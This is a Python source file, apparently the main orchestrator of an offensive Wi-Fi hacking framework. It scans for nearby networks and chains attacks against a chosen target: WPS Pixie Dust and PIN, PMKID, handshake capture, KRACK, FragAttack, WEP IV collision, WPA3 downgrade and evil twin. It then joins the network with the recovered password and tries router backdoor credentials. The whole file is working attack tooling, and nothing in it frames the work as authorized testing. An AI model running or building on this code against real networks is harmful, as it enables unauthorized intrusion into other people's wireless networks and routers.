#!/usr/bin/env python3
"""
Main orchestrator - INTELLIGENT COORDINATION ENGINE
Updated to use all 12 exploits efficiently with smart scheduling
"""

import os
import sys
import time
import signal
import subprocess
import threading
import queue
from datetime import datetime
from typing import Optional, Dict, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from enum import Enum

from config import Config, AttackConfig
from core.scanner import HyperScanner, NetworkTarget
from core.connection import ConnectionManager
from core.report import ReportGenerator
from exploits.base import ExploitRegistry, BaseExploit, ExploitResult


class AttackPhase(Enum):
    """Attack phases for sequential execution"""
    IMMEDIATE = 1      # 0-2 seconds - WPS, PMKID, backdoor
    FAST = 2           # 2-10 seconds - handshake, downgrade
    MEDIUM = 3         # 10-20 seconds - KRACK, FragAttack, Evil Twin
    SLOW = 4           # 20-30 seconds - IV collision (WEP)
    FALLBACK = 5       # Backdoor retry, evil twin retry


class ResourceType(Enum):
    """Resource types for conflict management"""
    CHANNEL = "channel"
    INTERFACE = "interface"
    GPU = "gpu"
    NETWORK = "network"


class SmartOrchestrator:
    """
    Intelligent orchestrator with:
    - Sequential phase-based execution (avoid resource conflicts)
    - Dynamic attack ordering based on target profile
    - Resource-aware scheduling
    - Early success termination
    """
    
    def __init__(self, config: Optional[Config] = None):
        self.config = config or Config()
        self.attack_config = AttackConfig()
        self.scanner = None
        self.connection_manager = None
        self.reporter = ReportGenerator(self.config.OUTPUT_DIR)
        self.start_time = None
        self.target: Optional[NetworkTarget] = None
        
        # Smart scheduling
        self.target_profile = {}
        self.attack_queue = []
        self.completed_attacks = []
        self.failed_attacks = []
        self.resource_lock = threading.Lock()
        self.current_channel = None
        
        # Performance tracking
        self.phase_results = defaultdict(list)
        
    def initialize(self) -> bool:
        """Initialize environment and dependencies"""
        print("\n" + "="*70)
        print("🧠 SMART WI-FI EXPLOITATION FRAMEWORK v3.0")
        print("   Intelligent Orchestration Engine Active")
        print("="*70)
        
        # Check root
        if os.geteuid() != 0:
            print("[!] Requires root privileges")
            return False
        
        # Check dependencies
        if not self._check_dependencies():
            return False
        
        # Setup monitor mode
        self._setup_monitor_mode()
        
        # Initialize components
        self.scanner = HyperScanner(self.config.MONITOR_INTERFACE, self.config)
        self.connection_manager = ConnectionManager(self.config.INTERFACE)
        
        return True
    
    def _check_dependencies(self) -> bool:
        """Check all required tools are available"""
        missing = []
        for tool, path in self.config.TOOL_PATHS.items():
            if not os.path.exists(path):
                missing.append(tool)
        
        # Check for new tools
        new_tools = ['hostapd', 'dnsmasq', 'mdk4']
        for tool in new_tools:
            result = subprocess.run(['which', tool], capture_output=True)
            if result.returncode != 0:
                missing.append(tool)
        
        if missing:
            print(f"[!] Missing dependencies: {', '.join(missing)}")
            print("[!] Install: apt install aircrack-ng reaver bully hcxtools hashcat hostapd dnsmasq mdk4")
            return False
        
        return True
    
    def _setup_monitor_mode(self):
        """Enable monitor mode on interface"""
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
        subprocess.run(["airmon-ng", "start", self.config.INTERFACE], capture_output=True)
    
    def discover_target(self) -> Optional[NetworkTarget]:
        """Discover and profile target network"""
        print("\n[📡] Scanning for targets...")
        
        targets = self.scanner.hyper_scan()
        
        if not targets:
            print("[-] No targets found")
            return None
        
        # Find strongest signal with WPA/WPA2 encryption
        for target in targets:
            if 'WPA' in target.encryption or 'WEP' in target.encryption:
                self.target = target
                break
        
        if not self.target:
            self.target = targets[0]
        
        # Build target profile for smart scheduling
        self.target_profile = self._build_target_profile()
        
        print(f"[+] Target: {self.target.ssid} ({self.target.bssid})")
        print(f"[+] Channel: {self.target.channel}, Encryption: {self.target.encryption}")
        print(f"[+] Signal: {self.target.power} dBm")
        print(f"[+] Router: {self.target_profile.get('vendor', 'Unknown')}")
        print(f"[+] WPS: {'Yes' if self.target_profile.get('wps_likely') else 'No'}")
        
        return self.target
    
    def _build_target_profile(self) -> Dict:
        """Build detailed target profile for attack selection"""
        profile = {
            'bssid': self.target.bssid,
            'ssid': self.target.ssid,
            'channel': self.target.channel,
            'encryption': self.target.encryption.upper(),
            'vendor': self.target.vendor if hasattr(self.target, 'vendor') else 'Unknown',
            'wps_likely': 'WPS' in self.target.encryption,
            'pmkid_likely': self._check_pmkid_likely(),
            'has_clients': False,  # Will be checked during attacks
            'attack_priority': []
        }
        
        # Determine encryption type
        enc = profile['encryption']
        
        if 'WEP' in enc:
            profile['encryption_type'] = 'WEP'
            profile['attack_priority'] = ['iv_collision']
            
        elif profile['wps_likely']:
            profile['encryption_type'] = 'WPA_WPS'
            profile['attack_priority'] = ['wps_pixie', 'wps_pin', 'pmkid', 'handshake_capture']
            
        elif profile['pmkid_likely']:
            profile['encryption_type'] = 'WPA2_PMKID'
            profile['attack_priority'] = ['pmkid', 'handshake_capture', 'krack', 'fragattack']
            
        elif 'WPA3' in enc:
            profile['encryption_type'] = 'WPA3'
            profile['attack_priority'] = ['downgrade', 'fragattack', 'evil_twin']
            
        else:
            profile['encryption_type'] = 'WPA2'
            profile['attack_priority'] = ['handshake_capture', 'krack', 'fragattack', 'evil_twin']
        
        # Always include backdoor as fallback
        profile['attack_priority'].append('backdoor')
        
        return profile
    
    def _check_pmkid_likely(self) -> bool:
        """Check if target likely vulnerable to PMKID attack"""
        # Known vulnerable vendors
        vulnerable_vendors = ['ASUS', 'NETGEAR', 'TP-LINK', 'D-LINK', 'UBIQUITI', 'MIKROTIK']
        
        vendor = self.target.vendor.upper() if self.target.vendor else ''
        
        if vendor in vulnerable_vendors:
            return True
        
        # Also check encryption string for PMKID indicators
        if 'PMKID' in self.target.encryption.upper():
            return True
        
        return False
    
    def _get_attack_by_name(self, name: str) -> Optional[BaseExploit]:
        """Get exploit instance by name"""
        exploit_map = {
            'wps_pixie': 'WPSPixieExploit',
            'wps_pin': 'WPSPinExploit',
            'pmkid': 'PMKIDExploit',
            'krack': 'KRACKExploit',
            'fragattack': 'FragAttackExploit',
            'iv_collision': 'IVCollisionExploit',
            'backdoor': 'RouterBackdoorExploit',
            'downgrade': 'WPA3DowngradeExploit',
            'evil_twin': 'EvilTwinExploit',
            'handshake_capture': 'handshake_capture'
        }
        
        try:
            if name == 'handshake_capture':
                from exploits.handshake import capture_handshake
                return capture_handshake
            elif name == 'evil_twin':
                from exploits.evil_twin import EvilTwinExploit
                return EvilTwinExploit(self.config)
            elif name == 'downgrade':
                from exploits.downgrade import WPA3DowngradeExploit
                return WPA3DowngradeExploit(self.config)
            else:
                # Get from registry
                for exploit_class in ExploitRegistry.get_all():
                    if exploit_class.__name__.lower() == exploit_map.get(name, '').lower():
                        return exploit_class(self.config)
        except ImportError as e:
            print(f"[!] Could not load {name}: {e}")
        
        return None
    
    def launch_smart_attack(self) -> Optional[Dict]:
        """
        Launch intelligent sequential attack based on target profile
        Avoids resource conflicts by running attacks in phases
        """
        print("\n[🧠] Smart Attack Planning")
        print("-" * 50)
        print(f"[*] Target Type: {self.target_profile.get('encryption_type')}")
        print(f"[*] Attack Priority: {self.target_profile.get('attack_priority')}")
        print("-" * 50)
        
        attack_priority = self.target_profile.get('attack_priority', [])
        
        # Phase 1: IMMEDIATE attacks (0-5 seconds) - WPS, PMKID
        print("\n[⚡ PHASE 1: Fast Exploits (0-5s)]")
        immediate_attacks = ['wps_pixie', 'wps_pin', 'pmkid', 'backdoor']
        
        for attack_name in immediate_attacks:
            if attack_name not in attack_priority:
                continue
            
            if time.time() - self.start_time > self.config.TIMEOUT_TOTAL - 5:
                break
                
            result = self._run_single_attack(attack_name)
            if result and result.get('success'):
                return result
        
        # Phase 2: FAST attacks (5-10 seconds) - Handshake capture, downgrade
        print("\n[🚀 PHASE 2: Fast Handshake & Downgrade (5-10s)]")
        fast_attacks = ['handshake_capture', 'downgrade']
        
        for attack_name in fast_attacks:
            if attack_name not in attack_priority:
                continue
                
            if time.time() - self.start_time > self.config.TIMEOUT_TOTAL - 10:
                break
                
            result = self._run_single_attack(attack_name)
            if result and result.get('success'):
                return result
        
        # Phase 3: MEDIUM attacks (10-20 seconds) - KRACK, FragAttack, Evil Twin
        print("\n[🔨 PHASE 3: Advanced Exploits (10-20s)]")
        
        # Run these in parallel but with channel coordination
        medium_attacks = []
        for attack_name in ['krack', 'fragattack', 'evil_twin']:
            if attack_name in attack_priority:
                medium_attacks.append(attack_name)
        
        if medium_attacks:
            result = self._run_parallel_with_sync(medium_attacks, max_workers=2)
            if result and result.get('success'):
                return result
        
        # Phase 4: SLOW attacks (20-30 seconds) - WEP IV collision
        print("\n[🐢 PHASE 4: Slow Exploits (20-30s)]")
        
        if 'iv_collision' in attack_priority:
            result = self._run_single_attack('iv_collision')
            if result and result.get('success'):
                return result
        
        # Phase 5: FALLBACK - Retry backdoor with different methods
        print("\n[🔄 PHASE 5: Fallback Attacks]")
        
        # Try evil twin with different settings
        if time.time() - self.start_time < self.config.TIMEOUT_TOTAL:
            result = self._run_single_attack('evil_twin')
            if result and result.get('success'):
                return result
        
        return None
    
    def _run_single_attack(self, attack_name: str, timeout_override: int = None) -> Optional[Dict]:
        """
        Run a single attack with proper resource management
        """
        print(f"\n[*] Running: {attack_name}")
        
        # Set channel before attack
        if hasattr(self.target, 'channel') and self.target.channel:
            self._set_channel(self.target.channel)
        
        # Get attack instance
        attack = self._get_attack_by_name(attack_name)
        
        if attack is None:
            print(f"[-] Attack {attack_name} not available")
            return None
        
        start_time = time.time()
        timeout = timeout_override or self.config.TIMEOUT_TOTAL - (time.time() - self.start_time)
        
        try:
            if attack_name == 'handshake_capture':
                # Special handling for handshake capture function
                from exploits.handshake import capture_handshake
                pcap_file = capture_handshake(
                    self.target.bssid,
                    self.config.MONITOR_INTERFACE,
                    self.target.channel,
                    self.target.ssid
                )
                if pcap_file:
                    result = {'success': True, 'method': 'handshake_capture', 'pcap_file': pcap_file}
                else:
                    result = {'success': False}
            
            elif attack_name == 'evil_twin':
                # Evil twin requires hostapd setup
                result_obj = attack.execute(self.target.to_dict(), self.config.MONITOR_INTERFACE)
                result = result_obj.to_dict() if hasattr(result_obj, 'to_dict') else {'success': result_obj.success}
                if hasattr(result_obj, 'password') and result_obj.password:
                    result['password'] = result_obj.password
            
            else:
                # Standard exploit
                result_obj = attack.execute(self.target.to_dict(), self.config.MONITOR_INTERFACE)
                result = result_obj.to_dict() if hasattr(result_obj, 'to_dict') else {'success': result_obj.success}
                if hasattr(result_obj, 'password') and result_obj.password:
                    result['password'] = result_obj.password
            
            elapsed = time.time() - start_time
            
            if result.get('success'):
                print(f"[✅] {attack_name} succeeded in {elapsed:.2f}s")
                if result.get('password'):
                    print(f"[🔑] Password: {result['password']}")
                return result
            else:
                print(f"[❌] {attack_name} failed ({elapsed:.2f}s)")
                
        except Exception as e:
            print(f"[❌] {attack_name} error: {e}")
        
        return None
    
    def _run_parallel_with_sync(self, attack_names: List[str], max_workers: int = 2) -> Optional[Dict]:
        """
        Run attacks in parallel with channel synchronization
        Ensures all attacks use the same channel to avoid conflicts
        """
        print(f"\n[*] Running parallel attacks: {', '.join(attack_names)}")
        
        # Set channel once for all attacks
        if hasattr(self.target, 'channel') and self.target.channel:
            self._set_channel(self.target.channel)
        
        result_queue = queue.Queue()
        
        def run_attack(name):
            # Each attack runs with channel already set
            attack = self._get_attack_by_name(name)
            if attack is None:
                return None
            
            try:
                if name == 'evil_twin':
                    from exploits.evil_twin import EvilTwinExploit
                    attack = EvilTwinExploit(self.config)
                    result_obj = attack.execute(self.target.to_dict(), self.config.MONITOR_INTERFACE)
                elif name == 'krack':
                    result_obj = attack.execute(self.target.to_dict(), self.config.MONITOR_INTERFACE)
                elif name == 'fragattack':
                    result_obj = attack.execute(self.target.to_dict(), self.config.MONITOR_INTERFACE)
                else:
                    return None
                
                if hasattr(result_obj, 'success') and result_obj.success:
                    result = {'success': True, 'method': name}
                    if hasattr(result_obj, 'password') and result_obj.password:
                        result['password'] = result_obj.password
                    result_queue.put(result)
                    return result
                    
            except Exception as e:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(run_attack, name) for name in attack_names]
            
            # Wait for first success or timeout
            deadline = time.time() + 15  # 15 seconds max for parallel phase
            
            while time.time() < deadline:
                try:
                    result = result_queue.get(timeout=0.5)
                    if result and result.get('success'):
                        # Cancel remaining futures
                        for future in futures:
                            future.cancel()
                        return result
                except queue.Empty:
                    # Check if any future completed
                    for future in futures:
                        if future.done():
                            try:
                                res = future.result(timeout=0)
                                if res and res.get('success'):
                                    return res
                            except:
                                pass
                    
                    if all(future.done() for future in futures):
                        break
        
        return None
    
    def _set_channel(self, channel: str):
        """Set monitor interface channel"""
        try:
            subprocess.run(
                ["iw", "dev", self.config.MONITOR_INTERFACE, "set", "channel", str(channel)],
                capture_output=True, timeout=2
            )
            self.current_channel = channel
        except Exception as e:
            pass
    
    def run_with_handshake_first(self) -> Optional[Dict]:
        """
        Alternative strategy: Capture handshake first, then crack
        Good for networks with connected clients
        """
        print("\n[🎯 Strategy: Handshake First]")
        
        # First capture handshake
        from exploits.handshake import capture_handshake
        
        pcap_file = capture_handshake(
            self.target.bssid,
            self.config.MONITOR_INTERFACE,
            self.target.channel,
            self.target.ssid
        )
        
        if not pcap_file:
            print("[-] Handshake capture failed")
            return None
        
        print(f"[+] Handshake captured: {pcap_file}")
        
        # Then try to crack it with GPU
        from exploits.pmkid import PMKIDExploit
        pmkid_exploit = PMKIDExploit(self.config)
        
        # Use GPU cracking on the handshake
        # This would require implementing handshake cracking
        # For now, return handshake file
        return {'success': True, 'method': 'handshake_capture', 'pcap_file': pcap_file}
    
    def connect_and_report(self, exploit_result: Dict) -> bool:
        """Connect to network and generate report"""
        if not exploit_result.get('password'):
            # If we have handshake but no password, save it for later
            if exploit_result.get('pcap_file'):
                print(f"\n[📁] Handshake saved: {exploit_result['pcap_file']}")
                print("[*] Use offline cracking with hashcat or aircrack-ng")
                return False
            return False
        
        print("\n[📶] Connecting to network...")
        
        # Try to connect
        if self.connection_manager.connect_with_password(
            self.target.ssid, 
            exploit_result['password']
        ):
            elapsed = time.time() - self.start_time
            print(f"[✅] Connected successfully in {elapsed:.2f} seconds!")
            
            # Get gateway IP
            gateway = self.connection_manager.get_gateway_ip()
            
            # Try router backdoor for additional info
            if gateway:
                print("\n[🔍] Attempting router backdoor...")
                from exploits.backdoor import RouterBackdoorExploit
                backdoor = RouterBackdoorExploit(self.config)
                backdoor_result = backdoor.execute({'gateway': gateway}, '')
                if backdoor_result.success:
                    exploit_result.update(backdoor_result.to_dict())
                    print(f"[+] Router access: {backdoor_result.router_username}:{backdoor_result.router_password}")
            
            # Generate report
            self.reporter.generate_report(
                self.target.to_dict(),
                exploit_result,
                gateway,
                elapsed
            )
            
            return True
        
        return False
    
    def cleanup(self):
        """Cleanup resources"""
        print("\n[🧹] Cleaning up...")
        
        # Kill any remaining processes
        subprocess.run(["pkill", "-f", "hostapd"], capture_output=True)
        subprocess.run(["pkill", "-f", "dnsmasq"], capture_output=True)
        subprocess.run(["airmon-ng", "stop", self.config.MONITOR_INTERFACE], capture_output=True)
        subprocess.run(["pkill", "-f", "wpa_supplicant"], capture_output=True)
        subprocess.run(["systemctl", "restart", "NetworkManager"], capture_output=True)
        
        print("[✓] Cleanup complete")
    
    def run(self) -> bool:
        """Main execution flow with smart orchestration"""
        if not self.initialize():
            return False
        
        self.start_time = time.time()
        
        # Discover and profile target
        if not self.discover_target():
            self.cleanup()
            return False
        
        # Choose strategy based on target profile
        encryption = self.target_profile.get('encryption_type', '')
        
        if encryption == 'WEP':
            # WEP - direct IV collision attack
            print("\n[🎯] WEP network detected - using IV collision attack")
            result = self._run_single_attack('iv_collision', timeout_override=40)
        elif self.target_profile.get('wps_likely'):
            # WPS - try pixie dust first
            print("\n[🎯] WPS detected - prioritizing WPS attacks")
            result = self._run_single_attack('wps_pixie')
            if not result or not result.get('success'):
                result = self._run_single_attack('wps_pin')
        elif self.target_profile.get('pmkid_likely'):
            # PMKID vulnerable
            print("\n[🎯] PMKID likely vulnerable")
            result = self._run_single_attack('pmkid')
        else:
            # Standard WPA2 - use smart sequential attack
            result = self.launch_smart_attack()
        
        if not result:
            # Final fallback: try to capture handshake
            print("\n[🔄] Final fallback: Handshake capture")
            from exploits.handshake import capture_handshake
            pcap_file = capture_handshake(
                self.target.bssid,
                self.config.MONITOR_INTERFACE,
                self.target.channel,
                self.target.ssid
            )
            if pcap_file:
                result = {'success': True, 'method': 'handshake_capture', 'pcap_file': pcap_file}
        
        if not result or not result.get('success'):
            print("\n[❌] All exploits failed!")
            self.cleanup()
            return False
        
        # Connect and report
        success = self.connect_and_report(result)
        
        self.cleanup()
        
        if success:
            print("\n" + "="*70)
            print("🏆 TASK COMPLETE! 🏆")
            print(f"⏱️  Total time: {time.time() - self.start_time:.2f} seconds")
            print("="*70)
        else:
            print("\n" + "="*70)
            print("⚠️  PARTIAL SUCCESS - Handshake Captured")
            print(f"⏱️  Time: {time.time() - self.start_time:.2f} seconds")
            print("="*70)
        
        return success


def signal_handler(signum, frame):
    """Handle Ctrl+C"""
    print("\n[!] Interrupted by user")
    sys.exit(0)


def main():
    """Entry point"""
    signal.signal(signal.SIGINT, signal_handler)
    
    # Load configuration
    config = Config.from_env()
    
    # Run smart orchestrator
    orchestrator = SmartOrchestrator(config)
    success = orchestrator.run()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
